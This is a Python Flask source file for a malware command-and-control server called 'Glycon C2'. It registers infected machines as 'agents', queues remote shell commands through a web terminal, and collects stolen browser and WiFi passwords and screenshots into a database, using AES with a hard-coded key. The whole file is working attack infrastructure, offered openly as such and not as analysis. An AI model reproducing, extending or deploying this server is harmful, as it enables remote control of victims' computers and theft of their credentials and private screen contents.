# ======================
# server.py - Glycon C2 Server
# ======================
from flask import Flask, render_template, request, jsonify, send_file, Response, redirect, url_for, flash
from flask_socketio import SocketIO, join_room, leave_room, emit
from flask_login import LoginManager, UserMixin, login_user, logout_user, login_required, current_user
from flask import send_from_directory
from werkzeug.security import generate_password_hash, check_password_hash
import sqlite3
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64
import json
import time
import os
import io
from threading import Lock
from datetime import datetime
import traceback

# Initialize Flask app
app = Flask(__name__, template_folder='templates')
app.secret_key = os.urandom(24)
socketio = SocketIO(app)

# Login Manager setup
login_manager = LoginManager(app)
login_manager.login_view = 'login'

# Configuration
CONFIG = {
    "host": "0.0.0.0",
    "port": 443,
    "database": "c2.db",
    "aes_key": b"32bytekey-ultra-secure-123456789",
    "aes_iv": b"16byteiv-9876543",
    "upload_folder": "uploads",
    "screenshot_folder": "screenshots",
    "max_content_length": 16 * 1024 * 1024  # 16MB max upload size
}

app.config['MAX_CONTENT_LENGTH'] = CONFIG["max_content_length"]

# Create required directories
os.makedirs(CONFIG["upload_folder"], exist_ok=True)
os.makedirs(CONFIG["screenshot_folder"], exist_ok=True)

# Database setup with proper schema
def init_db():
    conn = sqlite3.connect(CONFIG["database"])
    c = conn.cursor()
    
    # Create tables with proper schema
    c.execute('''
        CREATE TABLE IF NOT EXISTS agents (
            id TEXT PRIMARY KEY,
            hostname TEXT,
            ip TEXT,
            os TEXT,
            last_seen TEXT,
            status TEXT,
            privilege TEXT
        )
    ''')
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS tasks (
            id INTEGER PRIMARY KEY,
            agent_id TEXT,
            task_type TEXT,
            task_data TEXT,
            status TEXT,
            created_at TEXT,
            completed_at TEXT
        )
    ''')
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY,
            agent_id TEXT,
            browser TEXT,
            url TEXT,
            username TEXT,
            password TEXT,
            timestamp TEXT
        )
    ''')
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS screenshots (
            id INTEGER PRIMARY KEY,
            agent_id TEXT,
            image BLOB,
            timestamp TEXT
        )
    ''')
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY,
            username TEXT UNIQUE,
            password TEXT
        )
    ''')
    
    # Add default admin if not exists
    c.execute("INSERT OR IGNORE INTO users VALUES (?, ?, ?)", 
             (1, "admin", generate_password_hash("password")))
    
    conn.commit()
    conn.close()

init_db()

# User class for authentication
class User(UserMixin):
    def __init__(self, user_id):
        self.id = user_id

@login_manager.user_loader
def load_user(user_id):
    return User(user_id)

# Encryption/Decryption class
class SecureComms:
    @staticmethod
    def encrypt(data):
        cipher = AES.new(CONFIG["aes_key"], AES.MODE_CBC, CONFIG["aes_iv"])
        padded_data = pad(json.dumps(data).encode(), AES.block_size)
        ct_bytes = cipher.encrypt(padded_data)
        return base64.b64encode(ct_bytes)

    @staticmethod
    def decrypt(enc_data):
        cipher = AES.new(CONFIG["aes_key"], AES.MODE_CBC, CONFIG["aes_iv"])
        ct = base64.b64decode(enc_data)
        pt = cipher.decrypt(ct)
        return json.loads(unpad(pt, AES.block_size))

# ======================
# Authentication Routes
# ======================
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if not username or not password:
            return render_template('login.html', error="Username and password required")
        
        conn = sqlite3.connect(CONFIG["database"])
        c = conn.cursor()
        c.execute("SELECT * FROM users WHERE username=?", (username,))
        user = c.fetchone()
        conn.close()
        
        if user and check_password_hash(user[2], password):
            login_user(User(user[0]))
            return redirect(url_for('dashboard'))
        else:
            return render_template('login.html', error="Invalid credentials")
    
    return render_template('login.html')

@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('login'))

@app.route('/static/<path:filename>')
def static_files(filename):
    return send_from_directory('static', filename)

# ======================
# Main Application Routes
# ======================
@app.route('/')
@login_required
def dashboard():
    conn = sqlite3.connect(CONFIG["database"])
    c = conn.cursor()
    
    # Dashboard stats
    c.execute("SELECT COUNT(*) FROM agents")
    agent_count = c.fetchone()[0]
    
    c.execute("SELECT COUNT(*) FROM tasks WHERE status='pending'")
    pending_tasks = c.fetchone()[0]
    
    c.execute("SELECT COUNT(*) FROM credentials")
    credential_count = c.fetchone()[0]
    
    c.execute("SELECT * FROM agents ORDER BY last_seen DESC LIMIT 5")
    recent_agents = [dict(zip(['id', 'hostname', 'ip', 'os', 'last_seen', 'status', 'privilege'], row)) 
                    for row in c.fetchall()]
    
    c.execute("SELECT * FROM tasks ORDER BY created_at DESC LIMIT 5")
    recent_tasks = [dict(zip(['id', 'agent_id', 'task_type', 'task_data', 'status', 'created_at', 'completed_at'], row)) 
                   for row in c.fetchall()]
    
    conn.close()
    
    return render_template('dashboard.html', 
                         agent_count=agent_count,
                         pending_tasks=pending_tasks,
                         credential_count=credential_count,
                         recent_agents=recent_agents,
                         recent_tasks=recent_tasks)

@app.route('/settings')
@login_required
def settings():
    return render_template('settings.html', CONFIG=CONFIG)

@app.route('/agents')
@login_required
def agents():
    conn = sqlite3.connect(CONFIG["database"])
    c = conn.cursor()
    c.execute("SELECT * FROM agents ORDER BY last_seen DESC")
    agents = [dict(zip(['id', 'hostname', 'ip', 'os', 'last_seen', 'status', 'privilege'], row)) 
              for row in c.fetchall()]
    conn.close()
    return render_template('agents.html', agents=agents)

@app.route('/agent/<agent_id>')
@login_required
def agent_detail(agent_id):
    conn = sqlite3.connect(CONFIG["database"])
    c = conn.cursor()
    
    c.execute("SELECT * FROM agents WHERE id=?", (agent_id,))
    agent_data = c.fetchone()
    if not agent_data:
        flash("Agent not found", "danger")
        return redirect(url_for('agents'))
    
    agent = dict(zip(['id', 'hostname', 'ip', 'os', 'last_seen', 'status', 'privilege'], agent_data))
    
    c.execute("SELECT * FROM tasks WHERE agent_id=? ORDER BY created_at DESC LIMIT 20", (agent_id,))
    tasks = [dict(zip(['id', 'agent_id', 'task_type', 'task_data', 'status', 'created_at', 'completed_at'], row)) 
             for row in c.fetchall()]
    
    c.execute("SELECT * FROM credentials WHERE agent_id=? ORDER BY timestamp DESC LIMIT 20", (agent_id,))
    creds = [dict(zip(['id', 'agent_id', 'browser', 'url', 'username', 'password', 'timestamp'], row)) 
             for row in c.fetchall()]
    
    c.execute("SELECT id, timestamp FROM screenshots WHERE agent_id=? ORDER BY timestamp DESC LIMIT 5", (agent_id,))
    screenshots = [dict(zip(['id', 'timestamp'], row)) for row in c.fetchall()]
    
    conn.close()
    
    return render_template('agent_detail.html', 
                         agent=agent, 
                         tasks=tasks, 
                         creds=creds,
                         screenshots=screenshots)

@app.route('/terminal/<agent_id>')
@login_required
def terminal(agent_id):
    conn = sqlite3.connect(CONFIG["database"])
    c = conn.cursor()
    c.execute("SELECT * FROM agents WHERE id=?", (agent_id,))
    agent_data = c.fetchone()
    conn.close()
    
    if not agent_data:
        flash("Agent not found", "danger")
        return redirect(url_for('agents'))
    
    agent = {
        'id': agent_data[0],
        'hostname': agent_data[1],
        'ip': agent_data[2],
        'os': agent_data[3],
        'last_seen': agent_data[4],
        'status': agent_data[5],
        'privilege': agent_data[6]
    }
    
    return render_template('terminal.html', agent=agent)

@app.route('/screenshot/<int:screenshot_id>')
@login_required
def get_screenshot(screenshot_id):
    conn = sqlite3.connect(CONFIG["database"])
    c = conn.cursor()
    c.execute("SELECT image FROM screenshots WHERE id=?", (screenshot_id,))
    result = c.fetchone()
    conn.close()
    
    if not result or not result[0]:
        flash("Screenshot not found or empty", "danger")
        return redirect(url_for('screenshots'))
    
    return send_file(
        io.BytesIO(result[0]),
        mimetype='image/png',
        download_name=f"screenshot_{screenshot_id}.png"
    )

@app.route('/screenshots')
@login_required
def screenshots():
    agent_id = request.args.get('agent_id')
    conn = sqlite3.connect(CONFIG["database"])
    c = conn.cursor()
    
    if agent_id:
        c.execute('''SELECT s.id, s.timestamp, a.hostname, a.id as agent_id 
                     FROM screenshots s JOIN agents a ON s.agent_id = a.id 
                     WHERE s.agent_id=? ORDER BY s.timestamp DESC LIMIT 50''', (agent_id,))
    else:
        c.execute('''SELECT s.id, s.timestamp, a.hostname, a.id as agent_id 
                     FROM screenshots s JOIN agents a ON s.agent_id = a.id 
                     ORDER BY s.timestamp DESC LIMIT 50''')
    
    screenshots = [dict(zip(['id', 'timestamp', 'hostname', 'agent_id'], row)) 
                  for row in c.fetchall()]
    
    conn.close()
    return render_template('screenshots.html', screenshots=screenshots)

@app.route('/credentials')
@login_required
def credentials():
    browser = request.args.get('browser', 'all')
    conn = sqlite3.connect(CONFIG["database"])
    c = conn.cursor()
    
    if browser == 'all':
        c.execute("SELECT * FROM credentials ORDER BY timestamp DESC LIMIT 100")
    else:
        c.execute("SELECT * FROM credentials WHERE browser=? ORDER BY timestamp DESC LIMIT 100", 
                 (browser,))
    
    creds = [dict(zip(['id', 'agent_id', 'browser', 'url', 'username', 'password', 'timestamp'], row)) 
             for row in c.fetchall()]
    
    conn.close()
    return render_template('credentials.html', credentials=creds)

@app.route('/tasks')
@login_required
def tasks():
    conn = sqlite3.connect(CONFIG["database"])
    c = conn.cursor()
    c.execute("SELECT * FROM tasks ORDER BY created_at DESC LIMIT 100")
    tasks = [dict(zip(['id', 'agent_id', 'task_type', 'task_data', 'status', 'created_at', 'completed_at'], row)) 
             for row in c.fetchall()]
    conn.close()
    return render_template('tasks.html', tasks=tasks)

# ======================
# API Endpoints
# ======================
@app.route('/api/task', methods=['POST'])
@login_required
def create_task():
    try:
        # Check Content-Type header
        if request.content_type != 'application/json':
            return jsonify({
                "status": "error", 
                "message": "Content-Type must be application/json"
            }), 415

        data = request.get_json()
        if not data:
            return jsonify({
                "status": "error", 
                "message": "No JSON data provided"
            }), 400
        
        required_fields = ['agent_id', 'task_type']
        if not all(field in data for field in required_fields):
            return jsonify({
                "status": "error", 
                "message": f"Missing required fields: {required_fields}"
            }), 400
        
        conn = sqlite3.connect(CONFIG["database"])
        c = conn.cursor()
        
        c.execute("INSERT INTO tasks VALUES (?, ?, ?, ?, ?, ?, ?)",
                 (None, 
                  data['agent_id'], 
                  data['task_type'], 
                  json.dumps(data.get('task_data', {})),
                  'pending', 
                  datetime.now().isoformat(), 
                  None))
        
        conn.commit()
        task_id = c.lastrowid
        conn.close()
        
        socketio.emit('new_task', {
            'task_id': task_id,
            'agent_id': data['agent_id'],
            'task_type': data['task_type']
        })
        
        return jsonify({
            "status": "success", 
            "task_id": task_id
        })

    except Exception as e:
        return jsonify({
            "status": "error", 
            "message": str(e)
        }), 500

@app.route('/api/checkin', methods=['POST'])
def agent_checkin():
    conn = None
    try:
        print("\n=== New Checkin Request ===")
        print(f"From IP: {request.remote_addr}")
        print(f"Headers: {dict(request.headers)}")
        print(f"Content length: {len(request.data)} bytes")

        if not request.data:
            print("[!] Empty request received")
            return Response(SecureComms.encrypt({'type': 'noop'}),
                          mimetype='application/octet-stream')

        try:
            data = SecureComms.decrypt(request.data)
            print(f"[+] Decrypted data from agent: {data.get('agent_id', 'UNKNOWN')}")
        except Exception as e:
            print(f"[!] Decryption failed: {str(e)}")
            traceback.print_exc()
            return Response(SecureComms.encrypt({'type': 'noop'}),
                          mimetype='application/octet-stream')

        conn = sqlite3.connect(CONFIG["database"])
        conn.execute("PRAGMA journal_mode=WAL")
        c = conn.cursor()

        # Update or insert agent
        c.execute('''INSERT OR REPLACE INTO agents 
                    VALUES (?, ?, ?, ?, ?, ?, ?)''',
                 (data['agent_id'],
                  data.get('hostname', 'UNKNOWN'),
                  data.get('ip', '0.0.0.0'),
                  data.get('os', 'UNKNOWN'),
                  datetime.now().isoformat(),
                  'online',
                  data.get('privilege', 'user')))

        # Process credentials if present
        if 'credentials' in data:
            creds = data['credentials']
            print(f"[*] Processing {len(creds.get('browsers', []))} browser creds, "
                  f"{len(creds.get('wifi', []))} WiFi creds")

            for cred in creds.get('browsers', []):
                try:
                    c.execute('''INSERT OR IGNORE INTO credentials 
                                VALUES (?, ?, ?, ?, ?, ?, ?)''',
                             (None, data['agent_id'],
                              cred.get('browser', 'unknown'),
                              cred.get('url', ''),
                              cred.get('username', ''),
                              cred.get('password', ''),
                              datetime.now().isoformat()))
                except Exception as e:
                    print(f"[!] Credential insert error: {str(e)}")

            for wifi in creds.get('wifi', []):
                try:
                    c.execute('''INSERT OR IGNORE INTO credentials 
                                VALUES (?, ?, ?, ?, ?, ?, ?)''',
                             (None, data['agent_id'],
                              'wifi',
                              '',
                              wifi.get('ssid', ''),
                              wifi.get('password', ''),
                              datetime.now().isoformat()))
                except Exception as e:
                    print(f"[!] WiFi insert error: {str(e)}")

        # Process screenshot if present
        if 'screenshot' in data:
            print("[*] Processing screenshot attachment")
            try:
                if isinstance(data['screenshot'], str):
                    image_data = base64.b64decode(data['screenshot'])
                else:
                    image_data = data['screenshot']
                
                if len(image_data) > 10 * 1024 * 1024:
                    raise ValueError("Screenshot too large")
                
                c.execute('''INSERT INTO screenshots 
                            VALUES (?, ?, ?, ?)''',
                         (None, data['agent_id'],
                          image_data,
                          datetime.now().isoformat()))
                print(f"[+] Saved screenshot ({len(image_data)} bytes)")
            except Exception as e:
                print(f"[!] Screenshot processing failed: {str(e)}")
                traceback.print_exc()

        # Get pending task
        c.execute('''SELECT id, task_type, task_data FROM tasks 
                     WHERE agent_id=? AND status='pending'
                     ORDER BY created_at LIMIT 1''',
                 (data['agent_id'],))
        task = c.fetchone()

        if task:
            c.execute("UPDATE tasks SET status='executing' WHERE id=?", (task[0],))
            response = {
                'task_id': task[0],
                'type': task[1],
                'data': json.loads(task[2])
            }
            print(f"[*] Assigning task: {task[1]}")
        else:
            response = {'type': 'noop'}

        conn.commit()
        conn.close()

        encrypted_response = SecureComms.encrypt(response)
        return Response(encrypted_response,
                      mimetype='application/octet-stream')

    except Exception as e:
        print(f"[!!!] Critical checkin error: {str(e)}")
        traceback.print_exc()
        if conn:
            conn.rollback()
            conn.close()
        return Response(SecureComms.encrypt({'type': 'noop'}),
                      mimetype='application/octet-stream')

@app.route('/api/task_result', methods=['POST'])
def task_result():
    conn = None
    try:
        print("\n=== New Task Result ===")
        print(f"From IP: {request.remote_addr}")
        print(f"Content length: {len(request.data)} bytes")

        data = SecureComms.decrypt(request.data)
        print(f"[*] Task result from agent: {data.get('agent_id', 'UNKNOWN')}")
        
        conn = sqlite3.connect(CONFIG["database"])
        conn.execute("PRAGMA journal_mode=WAL")
        c = conn.cursor()
        
        c.execute('''UPDATE tasks SET status='completed', completed_at=?
                     WHERE id=?''', (datetime.now().isoformat(), data['task_id']))
        
          # Handle terminal output - modified this section
        c.execute("SELECT task_type, task_data FROM tasks WHERE id=?", (data['task_id'],))
        task = c.fetchone()
        if task:
            task_type = task[0]
            task_data = json.loads(task[1])
            
            if task_type == 'shell' and task_data.get('terminal', False):
                print(f"[*] Emitting terminal output for task {data['task_id']}")
                socketio.emit('terminal_output', {
                    'agent_id': data['agent_id'],
                    'command': task_data.get('cmd', ''),
                    'output': data['result'].get('output', 'No output'),
                    'error': data['result'].get('error', '')
                }, room=f"terminal_{data['agent_id']}")
        
        # Handle screenshot results
        if data['task_type'] == 'screenshot' and 'screenshot' in data['result']:
            try:
                image_data = base64.b64decode(data['result']['screenshot'])
                c.execute('''INSERT INTO screenshots 
                            VALUES (?, ?, ?, ?)''',
                         (None, data['agent_id'], 
                          image_data,
                          datetime.now().isoformat()))
                print(f"[+] Saved screenshot from task")
            except Exception as e:
                print(f"[!] Failed to process screenshot: {str(e)}")
        
        # Handle credential results
        if data['task_type'] == 'harvest_creds' and 'credentials' in data['result']:
            for cred in data['result']['credentials']:
                try:
                    c.execute('''INSERT INTO credentials 
                                VALUES (?, ?, ?, ?, ?, ?, ?)''',
                             (None, data['agent_id'], cred.get('browser', ''), 
                              cred.get('url', ''), cred.get('username', ''), cred.get('password', ''),
                              datetime.now().isoformat()))
                except Exception as e:
                    print(f"[!] Credential insert failed: {str(e)}")
        
        conn.commit()
        conn.close()
        
        socketio.emit('task_complete', {
            'task_id': data['task_id'],
            'agent_id': data['agent_id'],
            'task_type': data['task_type']
        })
        
        return jsonify({'status': 'success'})
    
    except Exception as e:
        print(f"[!!!] Task result processing failed: {str(e)}")
        traceback.print_exc()
        if conn:
            conn.rollback()
            conn.close()
        return jsonify({'status': 'error', 'message': str(e)}), 500

# ======================
# SocketIO Handlers
# ======================
@socketio.on('connect')
def handle_connect():
    if current_user.is_authenticated:
        print(f"User {current_user.id} connected")

@socketio.on('join_terminal')
def handle_join_terminal(data):
    join_room(f"terminal_{data['agent_id']}")
    emit('terminal_status', {'status': 'Connected', 'connected': True})

@socketio.on('join_terminal')
def handle_join_terminal(data):
    join_room(f"terminal_{data['agent_id']}")
    emit('terminal_status', {
        'status': 'Connected', 
        'connected': True,
        'agent_id': data['agent_id']
    }, room=f"terminal_{data['agent_id']}")

@socketio.on('terminal_command')
def handle_terminal_command(data):
    try:
        conn = sqlite3.connect(CONFIG["database"])
        c = conn.cursor()
        
        task_data = {
            'cmd': data['command'],
            'terminal': True
        }
        
        c.execute("INSERT INTO tasks VALUES (?, ?, ?, ?, ?, ?, ?)",
                 (None, data['agent_id'], 'shell', json.dumps(task_data),
                  'pending', datetime.now().isoformat(), None))
        
        conn.commit()
        task_id = c.lastrowid
        conn.close()
        
        emit('terminal_output', {
            'agent_id': data['agent_id'],
            'command': data['command'],
            'output': f"[+] Command queued (Task ID: {task_id})"
        }, room=f"terminal_{data['agent_id']}")
    except Exception as e:
        emit('terminal_output', {
            'agent_id': data['agent_id'],
            'error': f"Command submission failed: {str(e)}"
        }, room=f"terminal_{data['agent_id']}")

# ======================
# Main Execution
# ======================
if __name__ == '__main__':
    print(f"Starting C2 server on {CONFIG['host']}:{CONFIG['port']}")
    socketio.run(app, 
                host=CONFIG["host"], 
                port=CONFIG["port"], 
                ssl_context='adhoc', 
                debug=True)